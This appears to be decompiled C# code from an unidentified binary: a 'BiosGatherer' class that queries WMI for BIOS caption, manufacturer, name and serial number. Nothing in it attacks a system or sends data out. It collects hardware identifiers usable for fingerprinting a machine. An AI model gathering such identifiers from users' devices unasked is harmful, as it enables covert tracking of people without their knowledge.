using System;

namespace NoiseMe.Drags.App.Data.WMI
{
	// Token: 0x0200016F RID: 367
	public static class BiosGatherer
	{
		// Token: 0x06000BDB RID: 3035 RVA: 0x0000930E File Offset: 0x0000750E
		public static string GetCaption()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Caption", null);
		}

		// Token: 0x06000BDC RID: 3036 RVA: 0x00009320 File Offset: 0x00007520
		public static string GetDescription()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Description", null);
		}

		// Token: 0x06000BDD RID: 3037 RVA: 0x00009332 File Offset: 0x00007532
		public static string GetName()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Name", null);
		}

		// Token: 0x06000BDE RID: 3038 RVA: 0x00009344 File Offset: 0x00007544
		public static string GetManufacturer()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Manufacturer", null);
		}

		// Token: 0x06000BDF RID: 3039 RVA: 0x00009356 File Offset: 0x00007556
		public static bool? IsPrimaryBios()
		{
			return WmiInstance.PropertyQuery<bool?>("Win32_BIOS", "PrimaryBIOS", null);
		}

		// Token: 0x06000BE0 RID: 3040 RVA: 0x00009368 File Offset: 0x00007568
		public static string GetSerialNumber()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "SerialNumber", null);
		}
	}
}
